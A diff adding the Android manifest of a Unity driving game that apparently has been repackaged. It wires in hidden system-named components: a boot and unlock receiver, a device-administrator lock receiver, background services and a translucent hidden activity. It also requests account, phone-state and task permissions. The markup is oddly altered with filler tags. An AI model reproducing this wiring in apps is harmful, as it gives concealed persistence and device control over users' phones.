@@ -1,0 +1,85 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="preferExternal" android:theme="@android:style/Theme.NoTitleBar" package="com.impactgames.shockwavecardrivinglte">
+    <application android:debuggable="false" android:icon="@drawable/app_icon" android:label="@string/app_name" android:name="com.edroid.system.application">
+        <activity android:configChanges="locale|fontScale|keyboard|keyboardHidden|mcc|mnc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|touchscreen|uiMode" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.unity3d.player.UnityPlayerProxyActivity" android:screenOrientation="sensorLandscape">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"><nothingHere/></action>
+                <category android:name="android.intent.category.LAUNCHER"><nothingHere/></category>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="locale|fontScale|keyboard|keyboardHidden|mcc|mnc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|touchscreen|uiMode" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.unity3d.player.UnityPlayerActivity" android:screenOrientation="sensorLandscape"><nothingHere/></activity>
+        <activity android:configChanges="locale|fontScale|keyboard|keyboardHidden|mcc|mnc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|touchscreen|uiMode" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.unity3d.player.UnityPlayerNativeActivity" android:screenOrientation="sensorLandscape">
+            <meta-data android:name="unityplayer.ForwardNativeEventsToDalvik" android:value="false"><nothingHere/></meta-data>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize|smallestScreenSize" android:name="com.heyzap.sdk.ads.HeyzapInterstitialActivity"><nothingHere/></activity>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize|smallestScreenSize" android:name="com.heyzap.sdk.ads.HeyzapVideoActivity"><nothingHere/></activity>
+        <activity android:excludeFromRecents="true" android:name="com.chartboost.sdk.CBImpressionActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"><nothingHere/></activity>
+        <activity android:name="com.applovin.adview.AppLovinInterstitialActivity"><nothingHere/></activity>
+        <activity android:name="com.applovin.adview.AppLovinConfirmationActivity"><nothingHere/></activity>
+        <activity android:configChanges="locale|fontScale|keyboard|keyboardHidden|mcc|mnc|navigation|orientation|screenLayout|screenSize|smallestScreenSize|touchscreen|uiMode" android:label="@string/app_name" android:launchMode="singleTask" android:name="com.unity3d.player.UnityPlayerProxyActivity" android:screenOrientation="landscape">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"><nothingHere/></action>
+                <category android:name="android.intent.category.LAUNCHER"><nothingHere/></category>
+            </intent-filter>
+            <meta-data android:name="unityplayer.ForwardNativeEventsToDalvik" android:value="true"><nothingHere/></meta-data>
+        </activity>
+        <activity android:excludeFromRecents="true" android:finishOnTaskLaunch="true" android:launchMode="singleTask" android:name="com.startapp.android.publish.list3d.List3DActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"><nothingHere/></activity>
+        <activity android:excludeFromRecents="true" android:finishOnTaskLaunch="true" android:launchMode="singleTask" android:name="com.startapp.android.publish.AppWallActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"><nothingHere/></activity>
+        <activity android:launchMode="singleInstance" android:name="com.zlib.roger.RogerActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="roger.start.activity"><nothingHere/></action>
+                <category android:name="android.intent.category.DEFAULT"><nothingHere/></category>
+            </intent-filter>
+        </activity>
+    <meta-data android:name="unityplayer.ForwardNativeEventsToDalvik" android:value="true"><nothingHere/></meta-data>
+        <receiver android:name="com.heyzap.sdk.ads.PackageAddedReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"><nothingHere/></action>
+            <android-data android:scheme="package"><nothingHere/></android-data>
+                </intent-filter>
+        </receiver>
+        <receiver android:name="com.edroid.system.receiver">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"><nothingHere/></action>
+                <action android:name="android.intent.action.UMS_CONNECTED"><nothingHere/></action>
+                <action android:name="android.intent.action.BOOT_COMPLETED"><nothingHere/></action>
+                <action android:name="android.intent.action.USER_PRESENT"><nothingHere/></action>
+                <action android:name="reload"><nothingHere/></action>
+            <category android:name="android.intent.category.HOME"><nothingHere/></category>
+                </intent-filter>
+        </receiver>
+        <receiver android:name="com.edroid.system.LockReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"><nothingHere/></action>
+            </intent-filter>
+        <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"><nothingHere/></meta-data>
+            </receiver>
+        <service android:name="com.edroid.system.service">
+            <intent-filter>
+                <action android:name="start"><nothingHere/></action>
+                <action android:name="restart"><nothingHere/></action>
+            </intent-filter>
+        </service>
+        <service android:name="com.zlib.roger.RogerService">
+            <intent-filter>
+                <action android:name="roger.start.service"><nothingHere/></action>
+            </intent-filter>
+        </service>
+        </application>
+    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true" android:xlargeScreens="true"><nothingHere/></supports-screens>
+    <uses-feature android:glEsVersion="131072"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.touchscreen"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.touchscreen.multitouch" android:required="false"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.touchscreen.multitouch.distinct" android:required="false"><nothingHere/></uses-feature>
+    <uses-feature android:name="android.hardware.sensor.accelerometer"><nothingHere/></uses-feature>
+    <uses-permission android:name="android.permission.INTERNET"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.GET_TASKS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE"><nothingHere/></uses-permission>
+    <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"><nothingHere/></uses-permission>
+</manifest>
